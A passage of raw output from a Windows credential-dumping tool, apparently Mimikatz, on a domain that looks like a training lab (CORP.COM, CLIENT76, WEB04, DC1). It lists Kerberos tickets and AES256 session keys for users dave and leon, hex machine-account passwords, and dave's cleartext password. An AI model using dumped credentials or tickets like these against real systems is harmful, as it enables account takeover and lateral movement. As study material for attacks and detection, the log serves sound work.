           Client Name  (01) : dave ; @ CORP.COM
           Flags 40810000    : name_canonicalize ; renewable ; forwardable ; 
           Session Key       : 0x00000012 - aes256_hmac      
             3f9e20fc9c129d9d818b8ade4fafe2e9eaab3b469fe73edbe0a1b39391fc4160
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 12       [...]

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket
         [00000000]
           Start/End/MaxRenew: 7/8/2025 11:53:35 PM ; 7/9/2025 9:53:35 AM ; 7/15/2025 11:53:35 PM
           Service Name (02) : krbtgt ; CORP.COM ; @ CORP.COM
           Target Name  (02) : krbtgt ; CORP ; @ CORP.COM
           Client Name  (01) : dave ; @ CORP.COM ( CORP )
           Flags 40c10000    : name_canonicalize ; initial ; renewable ; forwardable ; 
           Session Key       : 0x00000012 - aes256_hmac      
             5425c1faef2bc34f6c9df662f7ccd7f8a13acb6baee79bc71e3a749a198f70bf
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]

Authentication Id : 0 ; 4392694 (00000000:004306f6)
Session           : Batch from 0
User Name         : dave
Domain            : CORP
Logon Server      : DC1
Logon Time        : 7/8/2025 11:53:22 PM
SID               : S-1-5-21-1987370270-658905905-1781884369-1103

         * Username : dave
         * Domain   : CORP.COM
         * Password : (null)

        Group 0 - Ticket Granting Service
         [00000000]
           Start/End/MaxRenew: 7/8/2025 11:53:22 PM ; 7/9/2025 9:53:22 AM ; 7/15/2025 11:53:22 PM
           Service Name (02) : cifs ; web04 ; @ CORP.COM
           Target Name  (02) : cifs ; web04 ; @ CORP.COM
           Client Name  (01) : dave ; @ CORP.COM
           Flags 40810000    : name_canonicalize ; renewable ; forwardable ; 
           Session Key       : 0x00000012 - aes256_hmac      
             09da44693bb0cb626e85a89c240b7d34495b1d643efb49258753efd0c8421ae5
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 12       [...]

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket
         [00000000]
           Start/End/MaxRenew: 7/8/2025 11:53:22 PM ; 7/9/2025 9:53:22 AM ; 7/15/2025 11:53:22 PM
           Service Name (02) : krbtgt ; CORP.COM ; @ CORP.COM
           Target Name  (02) : krbtgt ; CORP ; @ CORP.COM
           Client Name  (01) : dave ; @ CORP.COM ( CORP )
           Flags 40c10000    : name_canonicalize ; initial ; renewable ; forwardable ; 
           Session Key       : 0x00000012 - aes256_hmac      
             5d0a98ca87bb53afa629a08e3929a8d189b197b8bac5e0fa36fce219844ed09e
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]

Authentication Id : 0 ; 4385077 (00000000:0042e935)
Session           : Batch from 0
User Name         : dave
Domain            : CORP
Logon Server      : DC1
Logon Time        : 7/8/2025 11:52:35 PM
SID               : S-1-5-21-1987370270-658905905-1781884369-1103

         * Username : dave
         * Domain   : CORP.COM
         * Password : (null)

        Group 0 - Ticket Granting Service
         [00000000]
           Start/End/MaxRenew: 7/8/2025 11:52:36 PM ; 7/9/2025 9:52:35 AM ; 7/15/2025 11:52:35 PM
           Service Name (02) : cifs ; web04 ; @ CORP.COM
           Target Name  (02) : cifs ; web04 ; @ CORP.COM
           Client Name  (01) : dave ; @ CORP.COM
           Flags 40810000    : name_canonicalize ; renewable ; forwardable ; 
           Session Key       : 0x00000012 - aes256_hmac      
             d94d268669da1ff72ac479d7335650d0d87d30c83e810e4b9fc544ede56af495
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 12       [...]

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket
         [00000000]
           Start/End/MaxRenew: 7/8/2025 11:52:35 PM ; 7/9/2025 9:52:35 AM ; 7/15/2025 11:52:35 PM
           Service Name (02) : krbtgt ; CORP.COM ; @ CORP.COM
           Target Name  (02) : krbtgt ; CORP ; @ CORP.COM
           Client Name  (01) : dave ; @ CORP.COM ( CORP )
           Flags 40c10000    : name_canonicalize ; initial ; renewable ; forwardable ; 
           Session Key       : 0x00000012 - aes256_hmac      
             f356f16146f388f684f832a2b77f6171cb690d6fdd34914436e8c10309006d0b
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]

Authentication Id : 0 ; 4378562 (00000000:0042cfc2)
Session           : Batch from 0
User Name         : dave
Domain            : CORP
Logon Server      : DC1
Logon Time        : 7/8/2025 11:52:22 PM
SID               : S-1-5-21-1987370270-658905905-1781884369-1103

         * Username : dave
         * Domain   : CORP.COM
         * Password : (null)

        Group 0 - Ticket Granting Service
         [00000000]
           Start/End/MaxRenew: 7/8/2025 11:52:22 PM ; 7/9/2025 9:52:22 AM ; 7/15/2025 11:52:22 PM
           Service Name (02) : cifs ; web04 ; @ CORP.COM
           Target Name  (02) : cifs ; web04 ; @ CORP.COM
           Client Name  (01) : dave ; @ CORP.COM
           Flags 40810000    : name_canonicalize ; renewable ; forwardable ; 
           Session Key       : 0x00000012 - aes256_hmac      
             9f42ddd32dd724a15b0ea54865ce5618f328f3c93871d9d7800107b0db28bd03
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 12       [...]

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket
         [00000000]
           Start/End/MaxRenew: 7/8/2025 11:52:22 PM ; 7/9/2025 9:52:22 AM ; 7/15/2025 11:52:22 PM
           Service Name (02) : krbtgt ; CORP.COM ; @ CORP.COM
           Target Name  (02) : krbtgt ; CORP ; @ CORP.COM
           Client Name  (01) : dave ; @ CORP.COM ( CORP )
           Flags 40c10000    : name_canonicalize ; initial ; renewable ; forwardable ; 
           Session Key       : 0x00000012 - aes256_hmac      
             b9998b6ecbbbf42229278c5e3d5b52bafc104421cd409b003371f2581a1540d5
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]

Authentication Id : 0 ; 4370953 (00000000:0042b209)
Session           : Batch from 0
User Name         : dave
Domain            : CORP
Logon Server      : DC1
Logon Time        : 7/8/2025 11:51:35 PM
SID               : S-1-5-21-1987370270-658905905-1781884369-1103

         * Username : dave
         * Domain   : CORP.COM
         * Password : (null)

        Group 0 - Ticket Granting Service
         [00000000]
           Start/End/MaxRenew: 7/8/2025 11:51:36 PM ; 7/9/2025 9:51:35 AM ; 7/15/2025 11:51:35 PM
           Service Name (02) : cifs ; web04 ; @ CORP.COM
           Target Name  (02) : cifs ; web04 ; @ CORP.COM
           Client Name  (01) : dave ; @ CORP.COM
           Flags 40810000    : name_canonicalize ; renewable ; forwardable ; 
           Session Key       : 0x00000012 - aes256_hmac      
             8030972993c0ac4bde489a6956279aa4b5e111a4bdce442fe7bf43f038d0591c
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 12       [...]

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket
         [00000000]
           Start/End/MaxRenew: 7/8/2025 11:51:35 PM ; 7/9/2025 9:51:35 AM ; 7/15/2025 11:51:35 PM
           Service Name (02) : krbtgt ; CORP.COM ; @ CORP.COM
           Target Name  (02) : krbtgt ; CORP ; @ CORP.COM
           Client Name  (01) : dave ; @ CORP.COM ( CORP )
           Flags 40c10000    : name_canonicalize ; initial ; renewable ; forwardable ; 
           Session Key       : 0x00000012 - aes256_hmac      
             f6f6f665fabd5a3a178ab6389c1dd9d40c2895d6314c9f75805582efb8710189
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]

Authentication Id : 0 ; 4364390 (00000000:00429866)
Session           : Batch from 0
User Name         : dave
Domain            : CORP
Logon Server      : DC1
Logon Time        : 7/8/2025 11:51:22 PM
SID               : S-1-5-21-1987370270-658905905-1781884369-1103

         * Username : dave
         * Domain   : CORP.COM
         * Password : (null)

        Group 0 - Ticket Granting Service
         [00000000]
           Start/End/MaxRenew: 7/8/2025 11:51:22 PM ; 7/9/2025 9:51:22 AM ; 7/15/2025 11:51:22 PM
           Service Name (02) : cifs ; web04 ; @ CORP.COM
           Target Name  (02) : cifs ; web04 ; @ CORP.COM
           Client Name  (01) : dave ; @ CORP.COM
           Flags 40810000    : name_canonicalize ; renewable ; forwardable ; 
           Session Key       : 0x00000012 - aes256_hmac      
             4575a31a114fcdb04bb5bfe80a3108ca32aca4c9d80de984d5cac8145e44c7c4
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 12       [...]

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket
         [00000000]
           Start/End/MaxRenew: 7/8/2025 11:51:22 PM ; 7/9/2025 9:51:22 AM ; 7/15/2025 11:51:22 PM
           Service Name (02) : krbtgt ; CORP.COM ; @ CORP.COM
           Target Name  (02) : krbtgt ; CORP ; @ CORP.COM
           Client Name  (01) : dave ; @ CORP.COM ( CORP )
           Flags 40c10000    : name_canonicalize ; initial ; renewable ; forwardable ; 
           Session Key       : 0x00000012 - aes256_hmac      
             4722c2ad8ed19b7d58aa4043bd76fb41e80e070fff434bbd5062ce32d2766809
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]

Authentication Id : 0 ; 1730219 (00000000:001a66ab)
Session           : RemoteInteractive from 2
User Name         : leon
Domain            : CORP
Logon Server      : DC1
Logon Time        : 7/8/2025 10:59:54 PM
SID               : S-1-5-21-1987370270-658905905-1781884369-22101

         * Username : leon
         * Domain   : CORP.COM
         * Password : (null)

        Group 0 - Ticket Granting Service
         [00000000]
           Start/End/MaxRenew: 7/8/2025 11:01:56 PM ; 7/9/2025 8:59:54 AM ; 7/15/2025 10:59:54 PM
           Service Name (02) : ProtectedStorage ; DC1.corp.com ; @ CORP.COM
           Target Name  (02) : ProtectedStorage ; DC1.corp.com ; @ CORP.COM
           Client Name  (01) : leon ; @ CORP.COM
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ; 
           Session Key       : 0x00000012 - aes256_hmac      
             824a623b0fd235d0aa5533c8c5b2d25bb9599b2a6228e3d37c1a1bffc1c0b144
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 13       [...]
         [00000001]
           Start/End/MaxRenew: 7/8/2025 11:01:56 PM ; 7/9/2025 8:59:54 AM ; 7/15/2025 10:59:54 PM
           Service Name (02) : cifs ; DC1.corp.com ; @ CORP.COM
           Target Name  (02) : cifs ; DC1.corp.com ; @ CORP.COM
           Client Name  (01) : leon ; @ CORP.COM
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ; 
           Session Key       : 0x00000012 - aes256_hmac      
             4e6a72d7a0b7140cd1c0a60d747c01363927f05ad72945378085ef90d8b6bbb3
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 13       [...]
         [00000002]
           Start/End/MaxRenew: 7/8/2025 10:59:54 PM ; 7/9/2025 8:59:54 AM ; 7/15/2025 10:59:54 PM
           Service Name (02) : cifs ; DC1 ; @ CORP.COM
           Target Name  (02) : cifs ; DC1 ; @ CORP.COM
           Client Name  (01) : leon ; @ CORP.COM
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ; 
           Session Key       : 0x00000012 - aes256_hmac      
             4ccc7cb2d222aa6d074c1c97cbadd2c8cc96328c90e6e12402d12ca8471b8f9b
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 13       [...]
         [00000003]
           Start/End/MaxRenew: 7/8/2025 10:59:54 PM ; 7/9/2025 8:59:54 AM ; 7/15/2025 10:59:54 PM
           Service Name (02) : LDAP ; DC1.corp.com ; corp.com ; @ CORP.COM
           Target Name  (02) : LDAP ; DC1.corp.com ; corp.com ; @ CORP.COM
           Client Name  (01) : leon ; @ CORP.COM ( CORP.COM )
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ; 
           Session Key       : 0x00000012 - aes256_hmac      
             855960e458827f779534d9d63cbd799ce259ad6d3a94a89b1f97916cf6b30de5
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 13       [...]

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket
         [00000000]
           Start/End/MaxRenew: 7/8/2025 10:59:54 PM ; 7/9/2025 8:59:54 AM ; 7/15/2025 10:59:54 PM
           Service Name (02) : krbtgt ; CORP.COM ; @ CORP.COM
           Target Name  (--) : @ CORP.COM
           Client Name  (01) : leon ; @ CORP.COM ( $$Delegation Ticket$$ )
           Flags 60a10000    : name_canonicalize ; pre_authent ; renewable ; forwarded ; forwardable ; 
           Session Key       : 0x00000012 - aes256_hmac      
             7f3d048ac4e95a22c9e9ec1b0fffe4abe2c153f41d338fe0813993a5b976e187
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
         [00000001]
           Start/End/MaxRenew: 7/8/2025 10:59:54 PM ; 7/9/2025 8:59:54 AM ; 7/15/2025 10:59:54 PM
           Service Name (02) : krbtgt ; CORP.COM ; @ CORP.COM
           Target Name  (02) : krbtgt ; CORP.COM ; @ CORP.COM
           Client Name  (01) : leon ; @ CORP.COM ( CORP.COM )
           Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ; 
           Session Key       : 0x00000012 - aes256_hmac      
             8f90459a29364287f58d4bf7ad4eb577c0cf09dc4404ec1e17c4d4ec6dc4b366
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]

Authentication Id : 0 ; 1730184 (00000000:001a6688)
Session           : RemoteInteractive from 2
User Name         : leon
Domain            : CORP
Logon Server      : DC1
Logon Time        : 7/8/2025 10:59:54 PM
SID               : S-1-5-21-1987370270-658905905-1781884369-22101

         * Username : leon
         * Domain   : CORP.COM
         * Password : (null)

        Group 0 - Ticket Granting Service
         [00000000]
           Start/End/MaxRenew: 7/8/2025 10:59:55 PM ; 7/9/2025 8:59:54 AM ; 7/15/2025 10:59:54 PM
           Service Name (02) : LDAP ; DC1.corp.com ; corp.com ; @ CORP.COM
           Target Name  (02) : LDAP ; DC1.corp.com ; corp.com ; @ CORP.COM
           Client Name  (01) : leon ; @ CORP.COM ( CORP.COM )
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ; 
           Session Key       : 0x00000012 - aes256_hmac      
             6e66e8851fe93b35217b2d1b0b06debb3495fd0a194b7e501526c7c6452745a9
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 13       [...]

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket
         [00000000]
           Start/End/MaxRenew: 7/8/2025 10:59:54 PM ; 7/9/2025 8:59:54 AM ; 7/15/2025 10:59:54 PM
           Service Name (02) : krbtgt ; CORP.COM ; @ CORP.COM
           Target Name  (02) : krbtgt ; corp.com ; @ CORP.COM
           Client Name  (01) : leon ; @ CORP.COM ( corp.com )
           Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ; 
           Session Key       : 0x00000012 - aes256_hmac      
             530beb8a3c228337ed3e86a7e71dcf7b7f332130633f6dc19e8d75d4cde461f1
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]

Authentication Id : 0 ; 1705214 (00000000:001a04fe)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 7/8/2025 10:59:54 PM
SID               : S-1-5-90-0-2

         * Username : CLIENT76$
         * Domain   : corp.com
         * Password : 53 51 d9 f5 ed d7 44 37 86 4a 1d ff c9 a7 e4 30 f5 df 22 ef cc 2a 9a ca f6 ee 47 43 8e d8 31 c0 f7 4c 8e 69 99 07 a9 8f 09 bf f2 1c 3b 0e 31 1e b4 01 77 a8 20 66 a2 8b 93 58 5d 53 57 49 7e de 0a c8 df f9 b4 e8 e3 0c 57 db 8d 27 9f 0e b8 1d bb 45 0f 4a 5b 99 9b e1 f2 db 0a 1d 70 c8 ca 2a 58 17 3b c0 e6 1d 6b 73 0e 81 ae 0e 56 e0 b3 6e 70 24 a9 cc 56 42 f5 ee a0 37 d2 8f e7 bf a8 1a 93 08 98 f0 92 fe 60 44 89 c5 e3 e6 9f 43 9b 45 dd 6f 16 1d c8 cd 51 7d 91 a9 be 21 2c d5 96 e8 cc 40 14 24 7f 29 d4 ce d4 96 52 6b 20 f1 a6 37 36 ee 33 a0 3e 87 62 85 49 62 e3 42 49 2e 6a 69 b2 9d 4f 35 ea d2 f2 d1 dd bf cc 2b 4e 7c c7 2e 18 a6 64 ec 71 ce 5f 9a 00 61 ab 90 43 08 ac 11 7c 7b 2f 73 a1 48 e2 e0 c9 eb ee c1 fe c4 e5 cf 

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 1705181 (00000000:001a04dd)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 7/8/2025 10:59:54 PM
SID               : S-1-5-90-0-2

         * Username : CLIENT76$
         * Domain   : corp.com
         * Password : 53 51 d9 f5 ed d7 44 37 86 4a 1d ff c9 a7 e4 30 f5 df 22 ef cc 2a 9a ca f6 ee 47 43 8e d8 31 c0 f7 4c 8e 69 99 07 a9 8f 09 bf f2 1c 3b 0e 31 1e b4 01 77 a8 20 66 a2 8b 93 58 5d 53 57 49 7e de 0a c8 df f9 b4 e8 e3 0c 57 db 8d 27 9f 0e b8 1d bb 45 0f 4a 5b 99 9b e1 f2 db 0a 1d 70 c8 ca 2a 58 17 3b c0 e6 1d 6b 73 0e 81 ae 0e 56 e0 b3 6e 70 24 a9 cc 56 42 f5 ee a0 37 d2 8f e7 bf a8 1a 93 08 98 f0 92 fe 60 44 89 c5 e3 e6 9f 43 9b 45 dd 6f 16 1d c8 cd 51 7d 91 a9 be 21 2c d5 96 e8 cc 40 14 24 7f 29 d4 ce d4 96 52 6b 20 f1 a6 37 36 ee 33 a0 3e 87 62 85 49 62 e3 42 49 2e 6a 69 b2 9d 4f 35 ea d2 f2 d1 dd bf cc 2b 4e 7c c7 2e 18 a6 64 ec 71 ce 5f 9a 00 61 ab 90 43 08 ac 11 7c 7b 2f 73 a1 48 e2 e0 c9 eb ee c1 fe c4 e5 cf 

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 1704591 (00000000:001a028f)
Session           : Interactive from 2
User Name         : UMFD-2
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 7/8/2025 10:59:54 PM
SID               : S-1-5-96-0-2

         * Username : CLIENT76$
         * Domain   : corp.com
         * Password : 53 51 d9 f5 ed d7 44 37 86 4a 1d ff c9 a7 e4 30 f5 df 22 ef cc 2a 9a ca f6 ee 47 43 8e d8 31 c0 f7 4c 8e 69 99 07 a9 8f 09 bf f2 1c 3b 0e 31 1e b4 01 77 a8 20 66 a2 8b 93 58 5d 53 57 49 7e de 0a c8 df f9 b4 e8 e3 0c 57 db 8d 27 9f 0e b8 1d bb 45 0f 4a 5b 99 9b e1 f2 db 0a 1d 70 c8 ca 2a 58 17 3b c0 e6 1d 6b 73 0e 81 ae 0e 56 e0 b3 6e 70 24 a9 cc 56 42 f5 ee a0 37 d2 8f e7 bf a8 1a 93 08 98 f0 92 fe 60 44 89 c5 e3 e6 9f 43 9b 45 dd 6f 16 1d c8 cd 51 7d 91 a9 be 21 2c d5 96 e8 cc 40 14 24 7f 29 d4 ce d4 96 52 6b 20 f1 a6 37 36 ee 33 a0 3e 87 62 85 49 62 e3 42 49 2e 6a 69 b2 9d 4f 35 ea d2 f2 d1 dd bf cc 2b 4e 7c c7 2e 18 a6 64 ec 71 ce 5f 9a 00 61 ab 90 43 08 ac 11 7c 7b 2f 73 a1 48 e2 e0 c9 eb ee c1 fe c4 e5 cf 

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 1666385 (00000000:00196d51)
Session           : Interactive from 0
User Name         : dave
Domain            : CORP
Logon Server      : DC1
Logon Time        : 7/8/2025 10:59:36 PM
SID               : S-1-5-21-1987370270-658905905-1781884369-1103

         * Username : dave
         * Domain   : CORP.COM
         * Password : (null)

        Group 0 - Ticket Granting Service
         [00000000]
           Start/End/MaxRenew: 7/8/2025 10:59:37 PM ; 7/9/2025 8:59:36 AM ; 7/15/2025 10:59:36 PM
           Service Name (02) : cifs ; WEB04.corp.com ; @ CORP.COM
           Target Name  (02) : cifs ; WEB04.corp.com ; @ CORP.COM
           Client Name  (01) : dave ; @ CORP.COM
           Flags 40810000    : name_canonicalize ; renewable ; forwardable ; 
           Session Key       : 0x00000012 - aes256_hmac      
             877c660b0cf71db029813693ec062a8e71a86f64d78f9cf54ad332adad39ac5a
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 11       [...]

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket
         [00000000]
           Start/End/MaxRenew: 7/8/2025 10:59:36 PM ; 7/9/2025 8:59:36 AM ; 7/15/2025 10:59:36 PM
           Service Name (02) : krbtgt ; CORP.COM ; @ CORP.COM
           Target Name  (02) : krbtgt ; CORP ; @ CORP.COM
           Client Name  (01) : dave ; @ CORP.COM ( CORP )
           Flags 40c10000    : name_canonicalize ; initial ; renewable ; forwardable ; 
           Session Key       : 0x00000012 - aes256_hmac      
             51932bd4da28d54de9651f3ef870c027c998c57ca68a8e5112cfcfe1a1f286c0
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]

Authentication Id : 0 ; 1440417 (00000000:0015faa1)
Session           : Batch from 0
User Name         : dave
Domain            : CORP
Logon Server      : DC1
Logon Time        : 7/8/2025 10:59:22 PM
SID               : S-1-5-21-1987370270-658905905-1781884369-1103

         * Username : dave
         * Domain   : CORP.COM
         * Password : (null)

        Group 0 - Ticket Granting Service
         [00000000]
           Start/End/MaxRenew: 7/8/2025 10:59:22 PM ; 7/9/2025 8:59:22 AM ; 7/15/2025 10:59:22 PM
           Service Name (02) : cifs ; web04 ; @ CORP.COM
           Target Name  (02) : cifs ; web04 ; @ CORP.COM
           Client Name  (01) : dave ; @ CORP.COM
           Flags 40810000    : name_canonicalize ; renewable ; forwardable ; 
           Session Key       : 0x00000012 - aes256_hmac      
             a2550e6bdf908fc0e77ad682f6d1a928c932d67741f85a983387856a7e7e302e
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 11       [...]

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket
         [00000000]
           Start/End/MaxRenew: 7/8/2025 10:59:22 PM ; 7/9/2025 8:59:22 AM ; 7/15/2025 10:59:22 PM
           Service Name (02) : krbtgt ; CORP.COM ; @ CORP.COM
           Target Name  (02) : krbtgt ; CORP ; @ CORP.COM
           Client Name  (01) : dave ; @ CORP.COM ( CORP )
           Flags 40c10000    : name_canonicalize ; initial ; renewable ; forwardable ; 
           Session Key       : 0x00000012 - aes256_hmac      
             d7e5cbd8aeadd97878e9fe2c39d9b5662a83b49dea1a914e3de749061b8ee984
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]

Authentication Id : 0 ; 225490 (00000000:000370d2)
Session           : Batch from 0
User Name         : dave
Domain            : CORP
Logon Server      : DC1
Logon Time        : 2/26/2025 11:29:17 PM
SID               : S-1-5-21-1987370270-658905905-1781884369-1103

         * Username : dave
         * Domain   : CORP.COM
         * Password : Flowers1

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 225489 (00000000:000370d1)
Session           : Service from 0
User Name         : dave
Domain            : CORP
Logon Server      : DC1
Logon Time        : 2/26/2025 11:29:17 PM
SID               : S-1-5-21-1987370270-658905905-1781884369-1103

         * Username : dave
         * Domain   : CORP.COM
         * Password : Flowers1

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 2/26/2025 11:29:01 PM
SID               : S-1-5-19

         * Username : (null)
         * Domain   : (null)
         * Password : (null)

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 54527 (00000000:0000d4ff)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 2/26/2025 11:29:01 PM
SID               : S-1-5-90-0-1

         * Username : CLIENT76$
         * Domain   : corp.com
         * Password : 1b f7 af 27 df 54 43 43 ce cf 64 5f 29 fe bd eb bc 2e dd 77 5f ac d3 d4 0d 19 26 bb 09 13 ee 82 c9 21 31 33 8b 5d 20 aa f4 8a c7 8a f6 ef 40 8d 28 9f 9b 3c de 36 cf 77 89 03 a2 ba 4f cb 1c 59 a0 6d 48 d5 55 bc 89 a7 5e 34 07 b7 0d f1 99 8b 85 3b f6 7a 72 df 0f 02 aa 73 82 20 5f 88 73 f9 e3 e6 9a 5a c0 3f 1d d5 0e 69 e5 96 bd 3e e0 e2 bb 73 72 29 b8 64 fb 1d 9a fe a0 ab 6f 70 d3 e7 9b 37 85 8d 46 ea 86 b9 72 e8 a2 b8 f8 81 6a 7d 8f f8 41 ae 70 ce cc 68 39 2d 80 02 76 4c 7a 82 44 5b fb a6 6f 6b cd a8 6c 3e 3f 21 74 72 b3 92 e7 bf b0 94 85 b5 ce 51 09 c9 bf 82 33 26 15 39 13 b7 f8 7d 1f dd 6f 56 6a 07 bb 0e 0e 61 42 7f e0 fd 56 dd c3 82 ad 46 78 a6 11 58 89 3d 83 75 6d f0 5e f7 a5 55 e7 b0 d1 5a 93 0f 08 15 b1 5f 

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 54452 (00000000:0000d4b4)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 2/26/2025 11:29:01 PM
SID               : S-1-5-90-0-1

         * Username : CLIENT76$
         * Domain   : corp.com
         * Password : 53 51 d9 f5 ed d7 44 37 86 4a 1d ff c9 a7 e4 30 f5 df 22 ef cc 2a 9a ca f6 ee 47 43 8e d8 31 c0 f7 4c 8e 69 99 07 a9 8f 09 bf f2 1c 3b 0e 31 1e b4 01 77 a8 20 66 a2 8b 93 58 5d 53 57 49 7e de 0a c8 df f9 b4 e8 e3 0c 57 db 8d 27 9f 0e b8 1d bb 45 0f 4a 5b 99 9b e1 f2 db 0a 1d 70 c8 ca 2a 58 17 3b c0 e6 1d 6b 73 0e 81 ae 0e 56 e0 b3 6e 70 24 a9 cc 56 42 f5 ee a0 37 d2 8f e7 bf a8 1a 93 08 98 f0 92 fe 60 44 89 c5 e3 e6 9f 43 9b 45 dd 6f 16 1d c8 cd 51 7d 91 a9 be 21 2c d5 96 e8 cc 40 14 24 7f 29 d4 ce d4 96 52 6b 20 f1 a6 37 36 ee 33 a0 3e 87 62 85 49 62 e3 42 49 2e 6a 69 b2 9d 4f 35 ea d2 f2 d1 dd bf cc 2b 4e 7c c7 2e 18 a6 64 ec 71 ce 5f 9a 00 61 ab 90 43 08 ac 11 7c 7b 2f 73 a1 48 e2 e0 c9 eb ee c1 fe c4 e5 cf 

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : CLIENT76$
Domain            : CORP
Logon Server      : (null)
Logon Time        : 2/26/2025 11:29:01 PM
SID               : S-1-5-20

         * Username : client76$
         * Domain   : CORP.COM
         * Password : (null)

        Group 0 - Ticket Granting Service
         [00000000]
           Start/End/MaxRenew: 7/8/2025 11:00:11 PM ; 7/9/2025 8:59:17 AM ; 7/15/2025 10:59:17 PM
           Service Name (02) : cifs ; DC1.corp.com ; @ CORP.COM
           Target Name  (02) : cifs ; DC1.corp.com ; @ CORP.COM
           Client Name  (01) : CLIENT76$ ; @ CORP.COM
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ; 
           Session Key       : 0x00000012 - aes256_hmac      
             e05ec6a67e68c170d102f2f4b4e3d7effe9af40d698d0ca5fe30828cd0156e23
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 13       [...]
         [00000001]
           Start/End/MaxRenew: 7/8/2025 10:59:20 PM ; 7/9/2025 8:59:17 AM ; 7/15/2025 10:59:17 PM
           Service Name (02) : ldap ; dc1.corp.com ; corp.com ; @ CORP.COM
           Target Name  (02) : ldap ; dc1.corp.com ; corp.com ; @ CORP.COM
           Client Name  (01) : CLIENT76$ ; @ CORP.COM ( CORP.COM )
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ; 
           Session Key       : 0x00000012 - aes256_hmac      
             de58e7a38ff5d83bacbfed887d1882e099da13e61c724748fb9edb4a69a623f7
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 13       [...]
         [00000002]
           Start/End/MaxRenew: 7/8/2025 10:59:17 PM ; 7/9/2025 8:59:17 AM ; 7/15/2025 10:59:17 PM
           Service Name (02) : ldap ; dc1.corp.com ; @ CORP.COM
           Target Name  (02) : ldap ; dc1.corp.com ; @ CORP.COM
           Client Name  (01) : CLIENT76$ ; @ CORP.COM
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ; 
           Session Key       : 0x00000012 - aes256_hmac      
             441e4c7f33a69893f8038ce84f78be2f1599d474c1affbdd60ef808819012274
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 13       [...]

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket
         [00000000]
           Start/End/MaxRenew: 7/8/2025 11:00:11 PM ; 7/9/2025 8:59:17 AM ; 7/15/2025 10:59:17 PM
